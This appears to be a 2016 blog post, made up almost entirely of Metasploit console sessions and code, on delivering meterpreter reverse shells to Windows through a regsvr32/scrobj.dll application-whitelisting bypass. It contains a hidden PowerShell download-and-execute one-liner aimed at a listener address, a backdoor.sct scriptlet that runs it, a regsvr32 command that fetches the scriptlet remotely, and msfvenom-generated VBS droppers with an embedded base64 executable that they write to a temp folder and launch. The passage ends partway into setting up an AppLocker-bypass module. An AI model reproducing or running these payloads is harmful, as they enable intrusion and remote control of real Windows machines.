---
title: Regsrv32 Exploit With Metasploit web_delivery
date: 2016-10-17 00:40:29
tags: Metasploit
---

### 0x01 Metasploit web_delivery
```
msf auxiliary(gitlab_user_enum) > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set target 2
target => 2
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set LHOST 192.168.0.100
LHOST => 192.168.0.100
msf exploit(web_delivery) > set LPORT 2333
LPORT => 2333
msf exploit(web_delivery) > exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.0.100:2333
[*] Using URL: http://0.0.0.0:9090/WXCOjGGir
msf exploit(web_delivery) >
[*] Local IP: http://192.168.0.100:9090/WXCOjGGir
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.0.100:9090/WXCOjGGir');
```
> backdoor.sct

```
<?xml version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
	>
	
	<!-- regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll
	<!-- DFIR -->
	<!--		.sct files are downloaded and executed from a path like this -->
	<!-- Though, the name and extension are arbitary.. -->
	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
	<!-- Based on current research, no registry keys are written, since call "uninstall" -->
	
	
	<!-- Proof Of Concept - Casey Smith @subTee -->
	<script language="JScript">
		<![CDATA[
	
			var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://192.168.0.100:9090/WXCOjGGir');");
	
		]]>
	</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[
	
	function Exec()
	{
		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
	}
	
]]>
</script>

</scriptlet>
```
### 0x02 windows run
```
C:\Documents and Settings\Administrator> regsvr32 /s /n /u /i:http://blog.safebuff.com/backdoor.sct scrobj.dll
```
### 0x03 Window cmd command line
```
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.204 LPORT=4444 EXITFUNC=thread -f vbs --arch x86 --platform win > test.vbs
> cat test.vbs
```
```
Function sdbyBeauKn(UZpyLbmAYKrH)
	YUwpsWAZxakH = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		UZpyLbmAYKrH & "</B64DECODE>"
	Set UwcHanJT = CreateObject("MSXML2.DOMDocument.3.0")
	UwcHanJT.LoadXML(YUwpsWAZxakH)
	sdbyBeauKn = UwcHanJT.selectsinglenode("B64DECODE").nodeTypedValue
	set UwcHanJT = nothing
End Function

Function GocoGnSZ()
	POTnBArG = "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"
	Dim gXjFxrfBUA
	Set gXjFxrfBUA = CreateObject("Scripting.FileSystemObject")
	Dim MiRpqcNrEnOtoGD
	Dim FzkOXxAmmUZ
	Set MiRpqcNrEnOtoGD = gXjFxrfBUA.GetSpecialFolder(2)
	FzkOXxAmmUZ = MiRpqcNrEnOtoGD & "\" & gXjFxrfBUA.GetTempName()
	gXjFxrfBUA.CreateFolder(FzkOXxAmmUZ)
	exOAGCRIezZZb = FzkOXxAmmUZ & "\" & "wdvgyIHBGGhnHe.exe"
	Dim pDdnPksEFDsWCH
	Set pDdnPksEFDsWCH = CreateObject("Wscript.Shell")
	olyAwkEzotkp = sdbyBeauKn(POTnBArG)
	Set FZVTocmXtqQxKIi = CreateObject("ADODB.Stream")
	FZVTocmXtqQxKIi.Type = 1
	FZVTocmXtqQxKIi.Open
	FZVTocmXtqQxKIi.Write olyAwkEzotkp
	FZVTocmXtqQxKIi.SaveToFile exOAGCRIezZZb, 2
	pDdnPksEFDsWCH.run exOAGCRIezZZb, 0, true
	gXjFxrfBUA.DeleteFile(exOAGCRIezZZb)
	gXjFxrfBUA.DeleteFolder(FzkOXxAmmUZ)
End Function

GocoGnSZ
```
```
C:\Documents and Settings\Administrator> echo shellcode = WScript.Arguments.Item(0):strXML = ^"^<B64DECODE xmlns:dt=^" ^& Chr(34) ^& ^"urn:schemas-microsoft-com:datatypes^" ^& Chr(34) ^& ^" ^" ^& ^"dt:dt=^" ^& Chr(34) ^& ^"bin.base64^" ^& Chr(34) ^& ^"^>^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) > %TEMP%\test.vbs

C:\Documents and Settings\Administrator> cscript.exe %TEMP%\test.vbs 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
```

---

### 0x04 Metasploit regsvr32_applocker_bypass_server
```
msf > use exploit/windows/misc/regsvr32_applocker_bypass_server
msf exploit(regsvr32_applocker_bypass_server) > set LHOST 192.168.0.100
LHOST => 192.168.0.100
